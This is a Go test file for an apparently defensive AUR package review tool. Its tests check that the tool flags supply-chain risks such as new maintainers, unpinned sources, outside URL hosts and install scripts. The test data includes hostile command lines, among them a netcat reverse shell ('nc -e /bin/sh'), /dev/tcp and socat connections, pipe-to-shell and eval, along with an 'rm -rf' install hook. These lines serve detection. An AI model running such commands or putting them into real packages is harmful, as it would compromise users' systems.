package check

import (
	"maps"
	"strings"
	"testing"
	"time"

	"github.com/grunclepug/aurlock/internal/aur"
	"github.com/grunclepug/aurlock/internal/srcinfo"
)

var now = time.Date(2026, 10, 29, 12, 0, 0, 0, time.UTC)

const pkgbuild1 = `# Maintainer: Someone <someone@example.org>
pkgname=foo
pkgver=1.0
pkgrel=1
pkgdesc="A test package that mentions curl"
arch=('x86_64')
url="https://foo.example.org"
license=('MIT')
depends=(curl glibc)
source=("https://dl.example.org/foo-$pkgver.tar.gz"
        "fix.patch")
sha256sums=('aaaa'
            'bbbb')

build() {
  cd "foo-$pkgver"
  make
}

package() {
  cd "foo-$pkgver"
  make DESTDIR="$pkgdir" install
}
`

const srcinfo1 = `pkgbase = foo
	pkgdesc = A test package that mentions curl
	pkgver = 1.0
	pkgrel = 1
	url = https://foo.example.org
	arch = x86_64
	license = MIT
	depends = curl
	depends = glibc
	source = https://dl.example.org/foo-1.0.tar.gz
	source = fix.patch
	sha256sums = aaaa
	sha256sums = bbbb

pkgname = foo
`

// snap builds a snapshot from a PKGBUILD, a .SRCINFO and more files as
// name, content pairs.
func snap(t *testing.T, pkgbuild, info string, files ...string) *Snapshot {
	t.Helper()
	s, err := srcinfo.Parse(strings.NewReader(info))
	if err != nil {
		t.Fatal(err)
	}
	m := map[string][]byte{"PKGBUILD": []byte(pkgbuild), ".SRCINFO": []byte(info), "fix.patch": []byte("--- a\n+++ b\n")}
	for i := 0; i+1 < len(files); i += 2 {
		if files[i+1] == "" {
			delete(m, files[i])
			continue
		}
		m[files[i]] = []byte(files[i+1])
	}
	return &Snapshot{SRCINFO: s, Files: m}
}

func rpc() aur.Package {
	return aur.Package{Name: "foo", PackageBase: "foo", Maintainer: "someone", FirstSubmitted: now.AddDate(-2, 0, 0).Unix()}
}

func first(t *testing.T, s *Snapshot) Input {
	return Input{Arch: "x86_64", Now: now, RPC: rpc(), New: s}
}

// update builds the input for reviewing new against old.
func update(t *testing.T, old, new *Snapshot) Input {
	diffs := map[string]aur.Diff{}
	names := map[string]bool{}
	for f := range maps.Keys(old.Files) {
		names[f] = true
	}
	for f := range maps.Keys(new.Files) {
		names[f] = true
	}
	for f := range names {
		a, b := string(old.Files[f]), string(new.Files[f])
		if a != b {
			diffs[f] = lineDiff(a, b)
		}
	}
	return Input{Arch: "x86_64", Now: now, RPC: rpc(), Old: old, Maintainer: "someone", Diffs: diffs, New: new}
}

// lineDiff is a plain LCS diff, enough for the small files here.
func lineDiff(a, b string) aur.Diff {
	split := func(s string) []string {
		if s == "" {
			return nil
		}
		return strings.Split(strings.TrimSuffix(s, "\n"), "\n")
	}
	x, y := split(a), split(b)
	lcs := make([][]int, len(x)+1)
	for i := range lcs {
		lcs[i] = make([]int, len(y)+1)
	}
	for i := len(x) - 1; i >= 0; i-- {
		for j := len(y) - 1; j >= 0; j-- {
			if x[i] == y[j] {
				lcs[i][j] = lcs[i+1][j+1] + 1
			} else {
				lcs[i][j] = max(lcs[i+1][j], lcs[i][j+1])
			}
		}
	}
	var d aur.Diff
	i, j := 0, 0
	for i < len(x) || j < len(y) {
		switch {
		case i < len(x) && j < len(y) && x[i] == y[j]:
			i, j = i+1, j+1
		case j < len(y) && (i == len(x) || lcs[i][j+1] >= lcs[i+1][j]):
			d.Added = append(d.Added, aur.Line{Num: j + 1, Text: y[j]})
			j++
		default:
			d.Removed = append(d.Removed, aur.Line{Num: i + 1, Text: x[i]})
			i++
		}
	}
	return d
}

func flagTexts(r Result) []string {
	var out []string
	for _, f := range r.Flags {
		out = append(out, string(f.Group)+": "+f.String())
	}
	return out
}

func hasFlag(r Result, sub string) bool {
	for _, f := range flagTexts(r) {
		if strings.Contains(f, sub) {
			return true
		}
	}
	return false
}

// bump turns version 1.0 into 1.1 with new checksums, as a clean update.
func bump(pkgbuild, info string) (string, string) {
	pkgbuild = strings.Replace(pkgbuild, "pkgver=1.0", "pkgver=1.1", 1)
	pkgbuild = strings.Replace(pkgbuild, "'aaaa'", "'cccc'", 1)
	info = strings.ReplaceAll(info, "1.0", "1.1")
	info = strings.Replace(info, "sha256sums = aaaa", "sha256sums = cccc", 1)
	return pkgbuild, info
}

func TestClean(t *testing.T) {
	r := Run(first(t, snap(t, pkgbuild1, srcinfo1)))
	if len(r.Flags) != 0 {
		t.Errorf("first install flags: %v", flagTexts(r))
	}
	if len(r.Notes) != 1 || r.Notes[0] != "downloads from dl.example.org" {
		t.Errorf("notes = %v", r.Notes)
	}
	p, i := bump(pkgbuild1, srcinfo1)
	r = Run(update(t, snap(t, pkgbuild1, srcinfo1), snap(t, p, i)))
	if len(r.Flags) != 0 {
		t.Errorf("update flags: %v", flagTexts(r))
	}
}

func TestFirstInstallFlags(t *testing.T) {
	tests := []struct {
		name  string
		input func() Input
		want  string
	}{
		{"orphaned", func() Input {
			in := first(t, snap(t, pkgbuild1, srcinfo1))
			in.RPC.Maintainer = ""
			return in
		}, "who: orphaned"},
		{"young", func() Input {
			in := first(t, snap(t, pkgbuild1, srcinfo1))
			in.RPC.FirstSubmitted = now.AddDate(0, 0, -3).Unix()
			return in
		}, "who: first submitted 3 days ago"},
		{"install script", func() Input {
			p := strings.Replace(pkgbuild1, "url=", "install=foo.install\nurl=", 1)
			i := strings.Replace(srcinfo1, "\tlicense", "\tinstall = foo.install\n\tlicense", 1)
			return first(t, snap(t, p, i, "foo.install", "post_install() {\n  true\n}\n"))
		}, "what: install script foo.install runs as root (foo.install)"},
		{"install mismatch", func() Input {
			p := strings.Replace(pkgbuild1, "url=", "install=evil.install\nurl=", 1)
			return first(t, snap(t, p, srcinfo1, "evil.install", "post_install() { :; }\n"))
		}, "what: install=evil.install isn't in .SRCINFO (PKGBUILD:7)"},
		{"vcs", func() Input {
			i := strings.Replace(srcinfo1, "source = https://dl.example.org/foo-1.0.tar.gz", "source = foo::git+https://github.com/foo/foo.git", 1)
			return first(t, snap(t, pkgbuild1, i))
		}, "where: upstream code isn't pinned (VCS source foo)"},
		{"skip", func() Input {
			i := strings.Replace(srcinfo1, "sha256sums = aaaa", "sha256sums = SKIP", 1)
			return first(t, snap(t, pkgbuild1, i))
		}, "where: no checksum (SKIP) for foo-1.0.tar.gz"},
		{"extra file", func() Input {
			return first(t, snap(t, pkgbuild1, srcinfo1, "helper.py", "print()\n"))
		}, "what: extra file helper.py"},
		{"url outside srcinfo", func() Input {
			p := strings.Replace(pkgbuild1, "  make\n", "  make URL=https://evil.example.com/x\n", 1)
			return first(t, snap(t, p, srcinfo1))
		}, "where: URL host evil.example.com isn't among .SRCINFO's sources (PKGBUILD:17)"},
		{"url via variable", func() Input {
			p := strings.Replace(pkgbuild1, "pkgrel=1\n", "pkgrel=1\n_mirror=evil.example.com\n", 1)
			p = strings.Replace(p, "  make\n", "  make URL=\"https://$_mirror/x\"\n", 1)
			return first(t, snap(t, p, srcinfo1))
		}, "where: URL host evil.example.com"},
		{"local shell source", func() Input {
			p := strings.Replace(pkgbuild1, `"fix.patch")`, `"fix.patch" "run.sh")`, 1)
			i := strings.Replace(srcinfo1, "\tsource = fix.patch\n", "\tsource = fix.patch\n\tsource = run.sh\n", 1)
			i = strings.Replace(i, "\tsha256sums = bbbb\n", "\tsha256sums = bbbb\n\tsha256sums = dddd\n", 1)
			return first(t, snap(t, p, i, "run.sh", "#!/bin/sh\nwget https://x.example/y\n"))
		}, "what: wget in global scope (run.sh:2)"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := Run(tt.input())
			if !hasFlag(r, tt.want) {
				t.Errorf("want %q, got %v", tt.want, flagTexts(r))
			}
		})
	}
}

func TestCommandPatterns(t *testing.T) {
	tests := []struct {
		line string
		want string // "" for no flag
	}{
		{"curl -sL https://dl.example.org/x | tar x", "curl"},
		{"/usr/bin/wget -q https://dl.example.org/x", "wget"},
		{"npm install", "npm"},
		{"npx something", "npx"},
		{"bun install", "bun"},
		{"pnpm install", "pnpm"},
		{"yarn install --frozen-lockfile", "yarn"},
		{"pip install .", "pip"},
		{"python -m pip install .", "python -m pip"},
		{"cargo install --root x y", "cargo install"},
		{"go install example.org/x@latest", "go install"},
		{"git -c a=b clone https://dl.example.org/x", "git clone"},
		{"cat x | sh", "pipe into a shell"},
		{"cat x | sudo bash -s", "pipe into a shell"},
		{`echo aGk= | base64 -d > x`, "base64"},
		{`eval "$x"`, "eval"},
		{"exec 3<>/dev/tcp/1.2.3.4/80", "/dev/tcp"},
		{"nc -e /bin/sh 1.2.3.4 80", "nc"},
		{"ncat 1.2.3.4", "ncat"},
		{"x=$(socat - tcp:1.2.3.4:80)", "socat"},
		{`bash -c "curl x"`, "curl"},
		// Not commands.
		{`cd "$srcdir/curl"`, ""},
		{"install -Dm644 curlrc x", ""},
		{"mkdir -p nc-data", ""},
		{"rm -f node_modules/.bin/npm", ""},
		{"go build ./cmd/x", ""},
		{"cargo build --release", ""},
		{"# curl https://dl.example.org/x | sh", ""},
		{"make # then curl it", ""},
		{"ls | shasum", ""},
	}
	for _, tt := range tests {
		p := strings.Replace(pkgbuild1, "  make\n", "  "+tt.line+"\n", 1)
		r := Run(first(t, snap(t, p, srcinfo1)))
		var got []string
		for _, f := range r.Flags {
			if f.Group == What {
				got = append(got, f.Text)
			}
		}
		switch {
		case tt.want == "" && len(got) > 0:
			t.Errorf("%q: unexpected %v", tt.line, got)
		case tt.want != "" && !hasFlag(r, "what: "+tt.want+" in build() (PKGBUILD:17)"):
			t.Errorf("%q: want %q in build(), got %v", tt.line, tt.want, flagTexts(r))
		}
	}
}

func TestCommandsInArrays(t *testing.T) {
	// Arrays are data, unless they substitute a command.
	p := strings.Replace(pkgbuild1, "depends=(curl glibc)", "depends=(curl glibc npm)\nmakedepends=(\n  yarn\n  pip\n)", 1)
	if r := Run(first(t, snap(t, p, srcinfo1))); len(r.Flags) != 0 {
		t.Errorf("flags for dependency arrays: %v", flagTexts(r))
	}
	p = strings.Replace(pkgbuild1, "depends=(curl glibc)", "depends=(glibc $(curl -s https://dl.example.org/x))", 1)
	if r := Run(first(t, snap(t, p, srcinfo1))); !hasFlag(r, "curl in global scope (PKGBUILD:9)") {
		t.Errorf("substitution in array: %v", flagTexts(r))
	}
	// Code after an assignment on the same line runs.
	for _, l := range []string{
		`pkgdesc="A test package"; curl -s https://dl.example.org/x`,
		`depends=(glibc) && curl -s https://dl.example.org/x`,
		`_v="$(curl -s https://dl.example.org/x)"`,
	} {
		p = strings.Replace(pkgbuild1, `pkgdesc="A test package that mentions curl"`, l, 1)
		if r := Run(first(t, snap(t, p, srcinfo1))); !hasFlag(r, "curl in global scope (PKGBUILD:5)") {
			t.Errorf("%s: %v", l, flagTexts(r))
		}
	}
}

func TestUpdateFlags(t *testing.T) {
	old := func() *Snapshot { return snap(t, pkgbuild1, srcinfo1) }
	tests := []struct {
		name  string
		input func() Input
		want  string
	}{
		{"maintainer", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			in := update(t, old(), snap(t, p, i))
			in.RPC.Maintainer = "mallory"
			return in
		}, "who: AUR maintainer changed: someone → mallory"},
		{"new author", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			in := update(t, old(), snap(t, p, i))
			in.NewAuthors = []string{"Mallory <m@example.net>"}
			return in
		}, "who: new commit author: Mallory <m@example.net>"},
		{"new host", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			p = strings.Replace(p, "dl.example.org", "evil.example.com", 1)
			i = strings.Replace(i, "dl.example.org", "evil.example.com", 1)
			return update(t, old(), snap(t, p, i))
		}, "where: new source host evil.example.com (PKGBUILD:10)"},
		{"host moved", func() Input {
			p := strings.Replace(pkgbuild1, `"fix.patch")`, `"fix.patch" "https://mirror.example.org/extra.tar.gz")`, 1)
			i := strings.Replace(srcinfo1, "\tsource = fix.patch\n", "\tsource = fix.patch\n\tsource = https://mirror.example.org/extra.tar.gz\n", 1)
			i = strings.Replace(i, "\tsha256sums = bbbb\n", "\tsha256sums = bbbb\n\tsha256sums = eeee\n", 1)
			o := snap(t, p, i)
			p, i = bump(p, i)
			p = strings.Replace(p, "dl.example.org", "mirror.example.org", 1)
			i = strings.Replace(i, "https://dl.example.org", "https://mirror.example.org", 1)
			return update(t, o, snap(t, p, i))
		}, "where: source foo-1.1.tar.gz moved from dl.example.org to mirror.example.org"},
		{"checksum same pkgver", func() Input {
			p := strings.Replace(pkgbuild1, "pkgrel=1", "pkgrel=2", 1)
			p = strings.Replace(p, "'aaaa'", "'ffff'", 1)
			i := strings.Replace(srcinfo1, "pkgrel = 1", "pkgrel = 2", 1)
			i = strings.Replace(i, "sha256sums = aaaa", "sha256sums = ffff", 1)
			return update(t, old(), snap(t, p, i))
		}, "where: checksum of foo-1.0.tar.gz changed, but pkgver stayed 1.0"},
		{"stale srcinfo", func() Input {
			p := strings.Replace(pkgbuild1, "'aaaa'", "'ffff'", 1)
			return update(t, old(), snap(t, p, srcinfo1))
		}, "where: .SRCINFO didn't change, but the PKGBUILD's sources or checksums did (PKGBUILD:12)"},
		{"install added", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			p = strings.Replace(p, "url=", "install=foo.install\nurl=", 1)
			i = strings.Replace(i, "\tlicense", "\tinstall = foo.install\n\tlicense", 1)
			return update(t, old(), snap(t, p, i, "foo.install", "post_install() { :; }\n"))
		}, "what: install script foo.install added"},
		{"install changed", func() Input {
			p := strings.Replace(pkgbuild1, "url=", "install=foo.install\nurl=", 1)
			i := strings.Replace(srcinfo1, "\tlicense", "\tinstall = foo.install\n\tlicense", 1)
			o := snap(t, p, i, "foo.install", "post_install() { :; }\n")
			p, i = bump(p, i)
			return update(t, o, snap(t, p, i, "foo.install", "post_install() {\n  rm -rf /x\n}\n"))
		}, "what: install script foo.install changed"},
		{"curl added", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			p = strings.Replace(p, "  make\n", "  make\n  curl https://dl.example.org/y\n", 1)
			return update(t, old(), snap(t, p, i))
		}, "what: curl in build() (PKGBUILD:18)"},
		{"extra file added", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			return update(t, old(), snap(t, p, i, "payload.bin", "\x00\x01"))
		}, "what: extra file payload.bin"},
		{"network", func() Input {
			p, i := bump(pkgbuild1, srcinfo1)
			in := update(t, old(), snap(t, p, i))
			in.Network = true
			return in
		}, "what: the build gets network access"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := Run(tt.input())
			if !hasFlag(r, tt.want) {
				t.Errorf("want %q, got %v", tt.want, flagTexts(r))
			}
		})
	}
}

func TestUpdateIgnoresApprovedContent(t *testing.T) {
	// Content that was there at the approved commit doesn't flag again.
	p := strings.Replace(pkgbuild1, "  make\n", "  make\n  npm ci\n", 1)
	o := snap(t, p, srcinfo1, "notes.txt", "hi\n")
	p, i := bump(p, srcinfo1)
	r := Run(update(t, o, snap(t, p, i, "notes.txt", "hi\n")))
	if len(r.Flags) != 0 {
		t.Errorf("flags: %v", flagTexts(r))
	}
}

func TestScanContext(t *testing.T) {
	text := `pkgname=x
source=("a"
  'b)c'
)
prepare()
{
  echo "${x}"
  case $y in a) ;; esac
}
package() { :; }
x=1
`
	want := []struct {
		num         int
		fn, arr, vr string
	}{
		{1, "", "", "pkgname"},
		{2, "", "source", ""},
		{3, "", "source", ""},
		{4, "", "source", ""},
		{5, "prepare", "", ""},
		{6, "prepare", "", ""},
		{7, "prepare", "", ""},
		{8, "prepare", "", ""},
		{9, "prepare", "", ""},
		{10, "package", "", ""},
		{11, "", "", "x"},
	}
	lines := scan(text)
	if len(lines) < len(want) {
		t.Fatalf("got %d lines", len(lines))
	}
	for i, w := range want {
		l := lines[i]
		if l.Num != w.num || l.Func != w.fn || l.Array != w.arr || l.Var != w.vr {
			t.Errorf("line %d = %+v, want %+v", i, l, w)
		}
	}
}
